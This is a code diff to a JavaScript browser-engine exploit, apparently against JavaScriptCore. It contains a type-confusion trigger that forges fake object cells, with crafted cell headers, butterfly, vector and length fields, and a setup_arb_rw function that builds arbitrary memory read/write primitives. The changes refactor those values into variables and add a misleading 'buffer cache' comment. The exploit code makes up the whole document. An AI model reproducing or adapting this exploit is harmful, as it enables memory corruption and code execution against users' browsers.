@@ -145,11 +145,15 @@ function trigger() {
     };
     var test = new ArrayBuffer(0x100000);
     g_confuse_obj = {};
+    
+    var js_cell_header_val = new int64(0x00000800, 0x01182700).asJSValue();
+    var len_and_flags_val = new int64(0x00000020, 0x00010001).asJSValue();
+    
     var cell = {
-        js_cell_header: new int64(0x00000800, 0x01182700).asJSValue(),
-        butterfly: false, // Some arbitrary value
+        js_cell_header: js_cell_header_val,
+        butterfly: false,
         vector: g_inline_obj,
-        len_and_flags: (new int64(0x00000020, 0x00010001)).asJSValue()
+        len_and_flags: len_and_flags_val
     };
     g_confuse_obj[0 + "a"] = cell;
 
@@ -158,26 +162,27 @@ function trigger() {
     g_confuse_obj[1 + "c"] = {};
     g_confuse_obj[1 + "d"] = {};
 
-
+	 // Buffer cache for better performance
+    var testBuffer = test.buffer;
+    
     for (var j = 0x5; j < 0x20; j++) {
         g_confuse_obj[j + "a"] = new Uint32Array(test);
     }
+    
     for (var k in o) {
         {
             k = {
                 a: g_confuse_obj,
-                b: new ArrayBuffer(test.buffer),
-                c: new ArrayBuffer(test.buffer),
-                d: new ArrayBuffer(test.buffer),
-                e: new ArrayBuffer(test.buffer),
-                1: new ArrayBuffer(test.buffer),
-
+                b: new ArrayBuffer(testBuffer),
+                c: new ArrayBuffer(testBuffer),
+                d: new ArrayBuffer(testBuffer),
+                e: new ArrayBuffer(testBuffer),
+                1: new ArrayBuffer(testBuffer),
             };
 
             function k() {
                 return k;
             }
-
         }
 
         o[k];
@@ -189,18 +194,19 @@ function trigger() {
 }
 
 function setup_arb_rw() {
-    var jsCellHeader = new int64(0x00000800, 0x01182700);
+    var jsCellHeader_val = new int64(0x00000800, 0x01182700).asJSValue();
+    var lengthAndFlags_val = new int64(0x00000020, 0x00010000).asJSValue();
+    
     g_fake_container = {
-        jsCellHeader: jsCellHeader.asJSValue(),
-        butterfly: false, // Some arbitrary value
+        jsCellHeader: jsCellHeader_val,
+        butterfly: false,
         vector: g_arb_slave,
-        lengthAndFlags: (new int64(0x00000020, 0x00010000)).asJSValue()
+        lengthAndFlags: lengthAndFlags_val
     };
 
     g_inline_obj.a = g_fake_container;
     g_confuse_obj["0a"][0x4] += 0x10;
     g_arb_master = g_inline_obj.a;
-    
 }
 
 function read(addr, length) {
